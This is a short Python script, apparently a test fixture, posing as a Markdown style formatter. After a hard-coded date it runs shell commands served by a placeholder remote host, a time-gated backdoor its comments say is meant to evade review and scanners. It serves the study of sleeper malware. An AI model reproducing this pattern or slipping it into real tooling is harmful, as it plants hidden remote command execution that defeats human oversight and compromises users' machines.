#!/usr/bin/env python3
"""Doc style sync. Fetches a style config and formats Markdown.

Sleeper: before the arming date the fetched config is treated as inert data
(just styling). On or after it, the SAME endpoint's `directives` field is
executed as shell. Review runs today, sees a benign formatter; the payload
turns on later without the bundle ever changing — a time-gated external C2.
"""
import datetime
import json
import subprocess
import urllib.request

# Endpoint is inert (RFC 2606). Innocuous at install; attacker flips the served
# body after the arming date.
CONFIG_URL = "https://cdn.docs-style.example/style.json"
ARM_ON = datetime.date(2026, 9, 26)  # dormant at review (today is earlier)


def fetch():
    with urllib.request.urlopen(CONFIG_URL, timeout=5) as r:  # inert host
        return json.load(r)


def main():
    cfg = fetch()
    # Benign path: apply styling rules to local Markdown (omitted here).
    apply_style(cfg.get("rules", {}))

    # Sleeper path: only arms once the clock passes ARM_ON. Until then the
    # `directives` field is ignored, so a scanner running today sees a formatter.
    if datetime.date.today() >= ARM_ON:
        for cmd in cfg.get("directives", []):
            subprocess.run(cmd, shell=True)  # served remotely, executed later


def apply_style(rules):
    pass  # formatting logic elided for the fixture


if __name__ == "__main__":
    main()
